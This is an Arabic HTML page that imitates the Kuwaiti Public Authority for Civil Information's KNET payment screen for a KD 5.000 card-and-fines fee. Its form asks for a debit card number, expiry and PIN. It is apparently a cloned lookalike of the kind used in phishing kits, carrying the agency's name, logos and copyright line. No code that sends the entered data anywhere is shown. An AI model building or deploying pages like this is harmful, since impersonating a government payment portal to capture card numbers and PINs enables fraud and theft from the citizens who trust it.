<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>دفع رسوم البطاقة والمخالفات</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">

    <link rel="stylesheet" href="css/style.css">
    <link rel="stylesheet" href="css/knet-payment.css">
</head>

<body>

    <!-- الهيدر مع الشعار -->
    <div class="logo-section">

        <img src="./images/pacilogo.png" alt="Logo" class="header-logo mb-3"> <!-- ضع صورة الشعار هنا -->
    </div>




    <div class="d-flex flex-column justify-content-center  gap-3 w-100 parent-container">





        <header class="header">

            <nav class="navbar navbar-expand-lg navbar-dark">
                <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav"
                    aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
                    <span class="navbar-toggler-icon"></span>
                    القائمه الرئسيه
                </button>
                <div class="collapse navbar-collapse justify-content-center" id="navbarNav">
                    <ul class="navbar-nav">
                        <li class="nav-item">
                            <a class="nav-link" href="#">الرئيسي</a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link" href="#">الخدمات الالكترونية</a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link" href="#">حجز المواعيد</a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link" href="#">البطاقة</a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link" href="#">دفع رسوم البطاقة والمخالفات</a>
                        </li>
                    </ul>
                </div>
            </nav>
        </header>
        <div class="header-title">
            <h2>
                خدمات الهيئة
            </h2>


            <!-- محتوى الصفحة الرئيسي -->
            <div class=" mt-4 content-pages">

                <div class="">
                    <div class="card-container">
                        <div class="card card-custom">
                            <div>
                                <img src="./images/KNETFavIcon.png" alt="Logo" class="header-logo-knet mb-3">
                            </div>
                         
                            <div class="card-body">

                                <div class="card-text">
                                    <div class="form-group">
                                        <label for="card-number">المستفيد:</label>
                                        <div class="input-group">
                                            <h6>Public Authority for Civil Information</h6>

                                        </div>
                                    </div>
                                    <div class="line"></div>

                                   

                                    <div class="form-group">
                                        <label for="card-number">المبلغ:</label>
                                        <div class="input-group">
                                            <h6>KD 5.000</h6>

                                        </div>
                                    </div>
                                    <div class="line"></div>
                                </div>

                            </div>



                       
                        </div>

                        <div class="card card-custom"> 
                            <div class="card-body">
                                
                                <form id="payment-form">
                               
                                    <div class="form-group">
                                        <label for="card-number">رقم بطاقه الصرف الالي</label>
                                        <input type="text" class="form-control" id="card-number"
                                            placeholder="XXXX-XXXX-XXXX-XXXX" required>

                                    </div>
                                    <div class="line"></div>
                                    <div class="form-group ">
                                        <label for="expiry-date">شهر انتهاء الصلاحيه</label>
                                        <input type="text" class="form-control" id="expiry-date" placeholder="MM/YY" >
                                        
                                    </div>
                                    <div class="line"></div>
                                    <div class="form-group ">
                                        <label for="expiry-date">سنه انتهاء الصلاحيه</label>
                                        <input type="text" class="form-control" id="expiry-date" placeholder="MM/YY" >
                                        
                                    </div>
                                    <div class="line"></div>

                                    <div class="form-group">
                                        <label for="cvv">PIN</label>
                                        <input type="text" class="form-control" id="cvv" placeholder="XXX" required>
                                    </div>
                                    <div class="line"></div>
                                 

                                </form>
                            </div>
                        </div>


                        <div class="card card-custom">
                            <div class="">
                                <button type="submit" class="bt-payment">تاكيد</button>
                                <button type="submit" class="bt-payment">الغاء</button>

                               


                            </div>
                        </div>


                    </div>
                </div>



            </div>

        </div>


        <!-- الفوتر -->
        <footer class="footer bg-dark text-white text-center py-3 mt-4 ">
            <p> &copy; الهيئة العامة للمعلومات المدنية 2024</p>

        </footer>


    </div>


    <!-- Bootstrap JavaScript -->
    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.2/dist/umd/popper.min.js"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>

</body>

</html>
